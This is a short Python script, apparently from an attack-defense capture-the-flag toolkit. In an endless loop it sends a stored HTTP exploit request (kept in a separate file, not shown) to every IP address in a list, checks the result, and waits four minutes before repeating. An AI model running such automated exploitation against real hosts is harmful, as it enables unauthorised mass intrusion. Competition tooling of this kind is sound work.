from web import WebPayload, WebStep, file2ip_list, file2http_request
import time

web1 = [
    WebPayload(
        [
            WebStep(
                # $IP
                file2http_request("./requests/web1.http"),
            ),
        ],
    )
]

if __name__ == "__main__":
    while True:
        list(
            map(lambda ip: web1[0].exploit({"$IP": ip}).check(), file2ip_list("ip.txt"))
        )
        time.sleep(60 * 4)
